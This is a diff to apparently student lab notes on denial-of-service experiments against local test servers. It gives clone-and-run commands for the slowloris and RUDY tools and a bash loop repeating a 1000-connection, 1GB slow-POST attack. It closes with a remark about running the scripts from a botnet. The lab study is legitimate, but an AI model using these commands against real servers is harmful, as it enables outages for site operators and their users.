@@ -123,3 +123,57 @@ slowloris 172.19.0.2 -p 5000 -s 500
 - I had to run multiple `hping3` or combinations of `hping3` with `ab` to make the `dynamic` version potentially slower, yet it was still available after a while.
 - Keep-alive connections seem to be more effective (makes sense).
 - Needs more experimentation.
+
+## Further on DDoS
+
+## Slowris
+
+I got it from the source repository 
+
+```sh
+git clone https://github.com/gkbrk/slowloris
+```
+
+And attacked the victims locally, from my machine. 
+
+For example, I had the static website running on localhost on port 5002 and did the attack:
+
+```sh
+cd slowloris
+python3 slowloris.py localhost -p 5002 -s 100 -v
+```
+
+- `-v`: Verbose output to see the logs.
+
+## RUDY
+
+This attacks are performed by opening fewr connections for a longer period and keeping them open as long as possible (depending on the resources of the attacker's machine). It opens concurrent POST HTTP connections and send payloads of varying sizes. It can be customised to send specific files as payloads, but by default is send a random payload of 1MB size.
+
+**Usage:**
+```sh
+git clone https://github.com/darkweak/rudy
+cd rudy
+go run rudy.go [command]
+```
+
+I experiment a bit with different values for the options of the attack command, which slowed down the dynamic server. Instead of depending on one standalone command, I run a script that does 50 times the attack with sleeping 5 sec between each. 
+
+```sh
+#!/bin/bash
+# Loop to run the attack 50 times with a 5-second pause between each
+for i in {1..50}
+do
+   go run rudy.go run -u http://localhost:8081 -c 1000 -i 100s -p 1GB
+   sleep 5
+done
+```
+
+This port was used for me for our static victim which died. 
+
+I got these logs from the container 
+![alt text](image.png)
+
+which prove that the nginx cannot handle the concurrent requests. 
+
+Improtant is that I could not run the commands for loads of concurrent requests with a large payload (e.g, 5GB) withouth my host running out of memory. But imagine running this scripts from different bots in our botnet. This will for sure bring down the server. 
+<<>>
